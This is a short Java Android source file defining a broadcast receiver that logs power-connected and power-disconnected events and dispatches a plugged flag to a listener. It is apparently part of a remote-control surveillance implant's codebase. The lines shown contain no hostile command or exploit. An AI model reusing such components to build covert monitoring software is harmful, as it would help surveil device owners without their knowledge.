package com.ht.RCSAndroidGUI.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.ht.RCSAndroidGUI.Ac;

public class BroadcastMonitorAc extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "AcBroadcastMonitor";

	/* (non-Javadoc)
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context, android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.d("QZ", TAG + " power notification, action: " + intent.getAction());
		
		boolean plugged = intent.getAction().equals(Intent.ACTION_POWER_CONNECTED);
		
		ListenerAc.self().dispatch(new Ac(plugged));
	}
}